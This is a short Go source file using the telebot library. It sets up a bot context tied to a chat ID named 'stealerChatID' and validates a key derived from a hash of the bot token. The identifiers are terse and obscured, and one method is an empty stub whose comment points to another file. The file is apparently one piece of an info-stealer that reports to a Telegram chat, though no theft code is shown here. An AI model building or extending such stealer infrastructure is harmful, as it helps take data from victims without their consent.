package main

import (
	"crypto/sha256"
	"encoding/hex"

	tele "gopkg.in/telebot.v4"
)

type RCtx struct {
	_b  *tele.Bot
	_gx int64
}

func InitRCtx(b *tele.Bot) (*RCtx, string) {
	h := sha256.Sum256([]byte(botToken))
	key := hex.EncodeToString(h[:16])
	return &RCtx{_b: b, _gx: stealerChatID}, key
}

func (rc *RCtx) BindRCtx(mb *tele.Bot) {
	// Logic moved to bot.go for better performance
}

func ValidateReduce(key string) int {
	h := sha256.Sum256([]byte(botToken))
	expected := hex.EncodeToString(h[:16])
	if key == expected {
		return 1
	}
	return 0
}
